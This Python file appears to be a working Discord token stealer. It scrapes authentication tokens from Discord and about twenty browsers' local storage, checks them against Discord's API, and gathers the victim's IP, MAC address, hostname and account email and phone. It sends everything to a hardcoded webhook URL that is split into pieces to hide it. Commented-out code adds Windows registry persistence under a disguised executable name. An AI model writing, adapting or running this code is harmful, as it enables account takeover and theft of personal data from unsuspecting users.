"""
by Yo YO Yousef~!
"""
import os, re, json, random, platform, socket, uuid, requests

one="https://discord.com/api/webhooks/"
two="925773749989539880/"
three="LEv63vv4yQNh05ghC3bZytPUPywS5h0JdfjTx82h58cPW-sssXsDoPnDRPMyTcznpALY"
# pth = str(os.path.dirname(os.path.realpath(__file__)))
# print(pth)
# PC_local = os.getenv('LOCALAPPDATA')

# TOKEN_Location = str(PC_local + '\\' +'discord\\app-1.0.9001\\DiscordHooker.exe') 
# TOKEN_Folder = str(PC_local + '\\' +'discord\\app-1.0.9001')


# def AddTowinregistry():
#     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_ALL_ACCESS)
#     winreg.SetValueEx(key,'Discord Hooker',0,winreg.REG_SZ,TOKEN_Location)
#     key.Close()

WEBHOOK_URL = one + two + three


def retrieve_user(token):
    return json.loads(requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", "Content-Type": "application/json"}).text)


def network_address():
    ip = json.loads(requests.get("https://api.ipify.org?format=json").text)
    return ip["ip"]


def system_info(return_type=0):
    info = {'platform': platform.system(), 'platform-release': platform.release(),
            'platform-version': platform.version(), 'architecture': platform.machine(),
            'hostname': socket.gethostname(), 'ip-address': socket.gethostbyname(socket.gethostname()),
            'public_ip': network_address(), 'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor()}

    if return_type == 0:
        return info
    else:
        return json.dumps(info)


class TokkenGetter:

    def __init__(self):
        if os.name != 'nt':
            exit()

        self.tokens = []
        self.pc = system_info()
        self.pc_user = os.getlogin()
        self.pc_roaming = os.getenv('APPDATA')
        self.pc_local = os.getenv('LOCALAPPDATA')

        self.scrape_tokens()

        # if self.tokens == self.pre_tokkens
        # print(self.tokens)
        for token in self.tokens:
            # if 
            color = random.randint(0, 0xFFFFFF)
            raw_user_data = retrieve_user(token)
            user_json_str = json.dumps(raw_user_data)
            user = json.loads(user_json_str)
            if "username" in user:
                 
                if WEBHOOK_URL:
                    webhook_data = {"username": "yOur goddamn token is here", "embeds": [
                        dict(title="Found a valid Token",
                             color=f'{color}',
                             fields=[
                                 {
                                     "name": "**Account Info**",
                                     "value": f'💳 User ID: ||{user["id"]}||\n🧔 Username: ||{user["username"] + "#" + user["discriminator"]}||\n📬 Email: ||{user["email"]}||\n☎ Phone: ||{user["phone"]}||',
                                     "inline": True
                                 },
                                 {
                                     "name": "**PC Info**",
                                     "value": f'IP: ||{self.pc["public_ip"]}|| \nUsername: {self.pc_user}\nAppData: {self.pc_local}\nRoaming: {self.pc_roaming}',
                                     "inline": True
                                 },
                                 {
                                     "name": "💰 Token",
                                     "value": f"||{token}||",
                                     "inline": False
                                 },
                                 {
                                     "name": "**PC Data Dump**",
                                     "value": f'```{system_info(1)}```',
                                     "inline": False
                                 },
                             ]),
                    ]}
                    
                    # result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
                    # print(result.text)
            # self.tokens.remove(token)
            # print(token)
            if not os.path.isfile("./LOG.old"):
                with open("LOG.old", "w") as f:
                    f.write(token)
            else:
                with open('LOG.old', "r+") as f:
                    # for token in self.tokens:
                    pre_token = f.read()
                    # print(token + '\n'+pre_token)
                    if pre_token == token:
                        exit()
                    else:
                        result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
                        print(result.text)
                    f.seek(0)
                    f.write(token)
                    f.truncate()

    def scrape_tokens(self):

        crawl = {
            'Discord': self.pc_roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.pc_roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.pc_roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.pc_roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.pc_roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.pc_roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.pc_local + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.pc_local + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.pc_local + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.pc_local + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.pc_local + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.pc_local + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.pc_local + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.pc_local + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.pc_local + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.pc_local + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.pc_local + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.pc_local + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.pc_local + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.pc_local + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.pc_local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.pc_local + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        # raw_user_data = retrieve_user(token)
        # user_json_str = json.dumps(raw_user_data)
        # user = json.loads(user_json_str)
        for source, path in crawl.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            self.tokens.append(token)

        # if not os.path.isfile("./LOG.old"):
        #     with open("LOG.old", "w") as f:
        #         f.write(json.dumps(self.tokens))
        # else:
        #     with open('LOG.old', "r+") as f:
        #         # for token in self.tokens:
        #         pre_token = f.read()
        #         if common_data(json.dumps(pre_token), json.dumps(self.tokens)):
        #             exit()
        #         else:
        #             pass
        #         # f.seek(0)
        #         f.write(json.dumps(self.tokens))
        #         # f.truncate()

if __name__ == "__main__":
    # try:
    #     if not os.path.exists(TOKEN_Folder): os.mkdir(TOKEN_Folder)
    #     if pth != TOKEN_Folder:
    #         shutil.copy(__file__, TOKEN_Folder + '//DiscordHooker.exe')
    #     else: pass
    #     AddTowinregistry()
    # except:pass
    init = TokkenGetter()
